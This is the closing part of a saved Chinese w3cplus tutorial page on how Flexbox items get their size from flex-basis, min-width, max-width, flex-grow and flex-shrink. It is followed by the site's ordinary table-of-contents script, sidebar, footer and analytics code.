+<p>由于<code>min-width</code>大于<code>max-width</code>时会取<code>min-width</code>，有了这个先取条件我们就可以将<code>flex-basis</code>和<code>min-width</code>做权重比较，即：<strong><code>flex-basis</code>会取<code>min-width</code></strong>。反过来，如果<code>min-width</code>小于<code>max-width</code>时则依旧会取<code>max-width</code>，同时要是<code>flex-basis</code>大于<code>max-width</code>就会取<code>max-width</code>。</p>
+
+<p>如果你理解了的话，可以使用更简单的规则来决定用于Flex项目的尺寸。</p>
+
+<blockquote>
+  <p><strong>首先根据<code>content</code> ➜ <code>width</code> ➜ <code>flex-basis</code>来决定用哪个来决定用于Flex项目。如果Flex项目显式设置了<code>flex-basis</code>属性，则会忽略<code>content</code>和<code>width</code>。而且<code>min-width</code>是用来设置Flex项目的下限值；<code>max-width</code>是用来设置Flex项目的上限值</strong>。</p>
+</blockquote>
+
+<p>虽然使用<code>flex-basis</code>显式设置Flex项目的尺寸优于<code>width</code>或<code>height</code>，但这仅是理想尺寸。因为在Flexbox布局中就算是你显式设置了<code>flex-basis</code>也不能保证这将是Flex项目的最终尺寸。那是 <strong>Flex项目放入Flex容器之后一切都将有可能改变</strong>。前面也提到过了，Flex项目的实际尺寸大小会被<code>flex</code>的另外两个属性<code>flex-grow</code>和<code>flex-shrink</code>的影响。简单地说，<strong>如果容器有足够多的空间，Flex项目会根据扩展因子扩展到足够填充Flex容器；反之，如果容器没有足够多的空间容纳Flex项目时，Flex项目会根据收缩因子缩小到足够被容纳在Flex容器中</strong>。</p>
+
+<h4 class="content-title" data-index="4">怎么设置Flex项目的基本大小</h4>
+
+<p>通过前面的学习，我们可以获知，<strong>对于Flex项目，显式设置<code>flex-basis</code>是一个最佳方案</strong>。但对于如何设置Flex项目的基本大小，我们可以围绕以下几点来进行思考：</p>
+
+<ul>
+<li><code>flex-basis</code>的值是<code>auto</code>？Flex项目显式的设置了宽度吗？如果设置了，Flex项目的大小将会基于设置的宽度</li>
+<li><code>flex-basis</code>的值是<code>auto</code>还是<code>content</code>？如果是<code>auto</code>，Flex项目的大小为原始大小</li>
+<li><code>flex-basis</code>的值是<code>0</code>的长度单位吗？如果是这样那这就是Flex项目的大小</li>
+<li><code>flex-basis</code>的值是<code>0</code>呢? 如果是这样，则Flex项目的大小不在Flex容器空间分配计算的考虑之内</li>
+</ul>
+
+<p>如果用简单的话来概括的话：</p>
+
+<ul>
+<li><strong><code>flex-basis</code>可以判断出Flex容器是存在剩余空间，还是存在不足空间</strong></li>
+<li><strong>如果Flex容器存在剩余空间，<code>flex-grow</code>可以按扩展因子来扩展Flex项目大小</strong></li>
+<li><strong>如果Flex容器存在不足空间，<code>flex-shrink</code>可以按收缩因子缩小Flex项目大小</strong></li>
+<li><strong>如果Flex项目显式设置了<code>max-width</code>值，即使Flex项目按照<code>flex-grow</code>扩展因子扩展了Flex项目尺寸，也不会大于<code>max-width</code>的值</strong></li>
+<li><strong>如果Flex项目显式设置了<code>min-width</code>值，即使Flex项目按照<code>flex-shrink</code>收缩因子收缩了Flex项目尺寸，也不会小于<code>min-width</code>的值</strong></li>
+</ul>
+
+<h2 class="content-title" data-index="2">第三部分正在努力更新中，敬请期待...</h2>
+</div></div></div>  </div>
+
+  
+   
+    <div id="node_footer" class="clearfix">
+              <div class="previous-next"><span class="prev">上一篇: </span><a href="https://www.w3cplus.com/css/css-flexbox-layout-model-part1.html" target="_blank"> 图解CSS：Flexbox布局(Part1)</a> | <span class="next">下一篇: </span><a href="https://www.w3cplus.com/css/uncommon-layout-tips.html" target="_blank">你可能不太熟知的布局技巧</a></div>            
+    </div>
+
+        
+
+</div>  </div>
+</div>
+  </div>
+
+        </div>
+
+      </div>
+    </div>
+
+    
+          <div id="sidebar-second" class="col-extra" style="position: sticky; top: 80px;">
+        <!-- <script type="text/javascript">document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E%3Cscript charset="utf-8" src="//rp.baidu.com/rp3w/3w.js?sid=10994702955876242907') + '&t=' + (Math.ceil(new Date()/3600000)) + unescape('"%3E%3C/script%3E'));</script> -->
+          <div class="region region-sidebar-second">
+    <div id="block-custom-search-blocks-1" class="block block-custom-search-blocks">
+
+    
+  <div class="content">
+    <form class="search-form" role="search" action="https://www.w3cplus.com/css/css-flexbox-layout-model-part2.html?expire=1699861536&amp;code=4wRXsClVJ1Y&amp;sign=d2a7d3b6774494ea96dd5432e23420c0" method="post" id="custom-search-blocks-form-1" accept-charset="UTF-8" target="_self"><div><div class="form-item form-type-textfield form-item-custom-search-blocks-form-1">
+  <label class="element-invisible" for="edit-custom-search-blocks-form-1--2">Search this site </label>
+ <input title="请输入您想搜索的关键词。" class="custom-search-box form-text" placeholder="" type="text" id="edit-custom-search-blocks-form-1--2" name="custom_search_blocks_form_1" value="" size="15" maxlength="128">
+</div>
+<input type="hidden" name="delta" value="1">
+<input type="hidden" name="form_build_id" value="form-R5CHgd3633Qzepj7aeSLXVtFAoeBcxYYGXzIq9Hs55Q">
+<input type="hidden" name="form_id" value="custom_search_blocks_form_1">
+<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="搜索" class="form-submit"></div></div></form>  </div>
+</div>
+<div id="block-block-53" class="block block-block">
+
+    <h2>直达目的地(^_^)</h2>
+  
+  <div class="content">
+    <div class="node-blog-title"><div class="atalog"><ul class="mb-2"> <li><a data-index="0" href="javascript:;" class="active">运用于Flex项目属性</a></li><li> <ul class="mb-2"><li><a data-index="1" href="javascript:;">align-self</a></li><li><a data-index="2" href="javascript:;">order</a></li><li><a data-index="3" href="javascript:;">flex</a></li><li> <ul class="mb-2"><li><a data-index="4" href="javascript:;">剩余空间和不足空间</a></li><li><a data-index="5" href="javascript:;">CSS尺寸属性和值</a></li><li><a data-index="6" href="javascript:;">内部尺寸和外部尺寸</a></li><li><a data-index="7" href="javascript:;">明确的尺寸和不确定的尺寸</a></li><li><a data-index="8" href="javascript:;">flex-grow</a></li><li><a data-index="9" href="javascript:;">flex-shrink</a></li><li><a data-index="10" href="javascript:;">flex-basis</a></li><li><a data-index="11" href="javascript:;">怎么设置Flex项目的基本大小</a></li></ul></li></ul></li><li><a data-index="12" href="javascript:;">第三部分正在努力更新中，敬请期待...</a></li></ul></div></div>
+
+<script>
+$('.node-blog h2').addClass('content-title');
+$('.node-blog h3').addClass('content-title');
+$('.node-blog h4').addClass('content-title');
+$('.node-blog h5').addClass('content-title');
+//  给 h2 到 h5 增加一个 data-index 的自定义属性
+$('.node-blog h2').attr('data-index', 2);
+$('.node-blog h3').attr('data-index', 3);
+$('.node-blog h4').attr('data-index', 4);
+$('.node-blog h5').attr('data-index', 5);
+
+//  函数的一个参数是标题级别，第二个参数是第一个标题的索引值
+function atalog(titleIndex, start) {
+    //  存储 HTML 和当前的索引值
+    var el = {
+        el: '',
+        index: start
+    };
+    var current = 0;  //  已遍历的数量
+
+    for (var i = start;i < $('.content-title').length;i ++) {
+        if (i < current) {
+            //  如果当前 i 的值小于已遍历的数量就跳过
+            continue;
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') > titleIndex) {
+            //  如果是更小一级的标题就调用自身继续查找
+            var result = atalog($('.content-title').eq(i).attr('data-index'), i);
+            //  把返回的 HTML 添加到当前函数的 el 中
+            el.el += '<li> ' + result.el + '</li>';
+            current = result.index + 1;  //  设置已遍历的数量
+            el.index = result.index;  //  设置索引
+            continue;  //  跳过本次循环
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') < titleIndex) {
+            //  如果是更大一级的标题就返回已生成的 HTML 目录
+            el.el = '<ul class="mb-2">' + el.el + '</ul>';
+            return el;
+        }
+        //  生成 HTML 目录
+        el.el += '<li><a data-index="' + i + '" href="javascript:;">' + $('.content-title').eq(i).text() + '</a></li>';
+        el.index = i;  //  设置当前的索引值为 i
+    }
+    //  添加列表的外层 ul
+    el.el = '<ul class="mb-2"> ' + el.el + '</ul>';
+    return el;  //  返回生成的 HTML 目录
+}
+
+//  调用生成目录的函数，从第 0 个 h2 开始
+var el = atalog(2, 0);
+//  把生成的目录插入到文章的开头
+$('.node-blog-title').prepend('<div class="atalog">' + el.el + '</div>');
+$(".node-blog-title .atalog > ul > li >a ").eq(0).addClass('active');
+//  给生成的目录添加点击事件
+$('.node-blog-title .atalog a').on('click', function () {
+    //  设置滚动条的高度为标题的 offsetTop
+     var topPos = $('.content-title').eq($(this).attr('data-index')).offset().top;
+var position = topPos - 80;
+    $(document).scrollTop(position);
+$('.node-blog-title .atalog a').removeClass('active')
+    $(this).toggleClass('active')
+});
+
+
+</script>
+
+  </div>
+</div>
+<div id="block-block-49" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img src="./Flexbox布局：图解CSS(Part2)_files/css-1.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/DEHQUMj/" target="_blank" title="防御式 CSS 精讲"><img src="./Flexbox布局：图解CSS(Part2)_files/css-3.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrwMDDU/" target="_blank" title="现代 Web 布局"><img src="./Flexbox布局：图解CSS(Part2)_files/css-2.jpg" border="0" alt="" width="300"></a></div>
+
+
+  </div>
+</div>
+  </div>
+      </div>
+    
+
+  </div>
+</div>
+
+  <div id="footer-col" class="footer-col">
+    <div class="container">
+        <div class="region region-footer-col">
+    <div id="block-block-39" class="block block-block">
+
+    <h2>关于我们</h2>
+  
+  <div class="content">
+    <a class="media-object" href="http://www.w3cplus.com/">W3cplus</a>
+<div class="media-body">
+	<p>W3cplus是一个致力于推广国内前端行业的技术博客。它以探索为己任，不断活跃在行业技术最前沿，努力提供高质量前端技术博文；其文章范围广泛，主要以CSS、HTML、JavaScript、A11Y、动画等教程为主。</p>
+</div>
+  </div>
+</div>
+<div id="block-block-40" class="block block-block">
+
+    <h2>关于站长</h2>
+  
+  <div class="content">
+    <p><a class="media-object" href="https://www.w3cplus.com/" target="_blank">大漠</a></p>
+<div class="media-body">
+	<p>常用昵称“大漠”，<a href="https://www.w3cplus.com/" target="_blank">W3CPlus</a>创始人，曾就职于淘宝。对HTML、CSS和A11Y等领域有一定的认识和丰富的实践经验。现在主要从事智能UI领域的探讨和学习！。CSS和Drupal中国布道者。2014年出版《<a href="https://www.w3cplus.com/book-comment.html">图解CSS3：核心技术与案例实战</a>》。</p>
+	<div class="social">
+		<a rel="nofollow" class="github" href="https://github.com/airen" target="_blank" title="github">github</a> <a rel="nofollow" class="twitter" href="https://twitter.com/w3cplus" target="_blank" title="twitter">twitter</a></div>
+</div>
+<p>&nbsp;</p>
+  </div>
+</div>
+<div id="block-block-41" class="block block-block">
+
+    <h2>我的作品</h2>
+  
+  <div class="content">
+    <a class="media-object" href="https://www.w3cplus.com/book-comment.html" target="_blank">图解CSS3</a>
+<div class="media-body">
+	<p>本书是历时2载的心血之作，根据最新的CSS撰写，融入了作者在CSS领域多年的使用经验，旨在将本书打造成为CSS领域最权威和实用的专业著作，供没有经验的读者系统学习，供有经验的读者参考备查。新版在《<a href="https://www.w3cplus.com/blog/tags/674.html">图解SS</a>》中持续更新！</p></div>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+  <div id="footer" class="footer">
+    <div class="container">
+        <div class="region region-footer">
+    <div id="block-block-54" class="block block-block">
+
+    
+  <div class="content">
+        <p><a rel="nofollow" href="http://www.beian.miit.gov.cn/" target="_blank">湘B2-20110104-7</a>，衡阳市雅米信息技术有限公司 © 2011-2022 <a href="https://www.w3cplus.com/page/26.html" target="_blank">W3CPLUS</a>，感谢<a rel="nofollow" href="https://www.drupal.org/" target="_blank">Drupal</a>开源技术。感谢<a rel="nofollow" href="https://www.qiniu.com/" target="_blank">七牛云存储</a>提供静态资源空间。</p>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="totop" style="position: fixed; bottom: 50px; right: 15px; cursor: pointer; z-index: 999999; display: block; opacity: 1;">
+  <!-- <div id="zhi12-shang-exp-2" class="shang-wrap" style="text-align: center;position:absolute;right: 0;bottom: 130%;z-index: 9999;">
+    <div><a class="zhi12-popup zhi12-widget" rel="nofollow" href="//www.zhi12.com/paycenter/reward?entity=user&id=5491" target="_blank"><img src="/sites/default/files/blogs/2019/1905/w3cplus-shang-2.png" alt="打赏" class="share-img" /></a></div>
+</div> -->
+    <a id="topLink" title="返回顶部">返回顶部</a>
+</div>  <script type="text/javascript" src="./Flexbox布局：图解CSS(Part2)_files/js_VU7P4CTgUZdF2SyFko5LLAg9ZK0OSVjXVaAFnTLgVt0.js.下载"></script>
+  
+  <script type="text/javascript" src="./Flexbox布局：图解CSS(Part2)_files/respond.min.js.下载"></script>
+<script type="text/javascript" src="./Flexbox布局：图解CSS(Part2)_files/js_ypadrG4kz9-JBpNOXmgjyVozLCJG_1RP3Ig-iqWR8n0.js.下载"></script>
+<script type="text/javascript" src="./Flexbox布局：图解CSS(Part2)_files/js_YFY-zVcRx2bEEpwBdCXta7mOli3xeW_KMe7Y6Mv8zGk.js.下载"></script>
+<script type="text/javascript" src="./Flexbox布局：图解CSS(Part2)_files/js_xP4aMPEI1iZ1ZrZMlSgsTllQqvH8oWbOQ7JVFWyrFCo.js.下载"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"w3cplusV2","theme_token":"k3wuoXir1QEacbUl10D_pEm0H2f7MzITqpP4z_-1kCk","js":{"modules\/statistics\/statistics.js":1,"sites\/all\/modules\/contrib\/respondjs\/lib\/respond.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery-html-prefilter-3.5.0-backport.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/zh-hans_71GwLEjcRL9b45LGd77xwMMW4YJ5etdnokx7XZMwKAc.js":1,"sites\/all\/modules\/contrib\/custom_search\/js\/custom_search.js":1,"sites\/all\/themes\/w3cplusV2\/js\/highlight.pack.js":1,"sites\/all\/themes\/w3cplusV2\/js\/main.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/paywall\/includes\/paywall_php_sdk\/paywall.css":1,"sites\/all\/modules\/contrib\/custom_search\/custom_search.css":1,"sites\/all\/themes\/w3cplusV2\/css\/style.css":1}},"custom_search":{"form_target":"_self","solr":0},"statistics":{"data":{"nid":"2639"},"url":"\/modules\/statistics\/statistics.php"},"urlIsAjaxTrusted":{"\/css\/css-flexbox-layout-model-part2.html?expire=1699861536\u0026code=4wRXsClVJ1Y\u0026sign=d2a7d3b6774494ea96dd5432e23420c0":true}});
+//--><!]]>
+</script>
+<script src="./Flexbox布局：图解CSS(Part2)_files/jquery.colorbox-min.js.下载"></script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?177319b798978621f83845b12c86fa29";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>  
+<span class="69116"></span>
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>
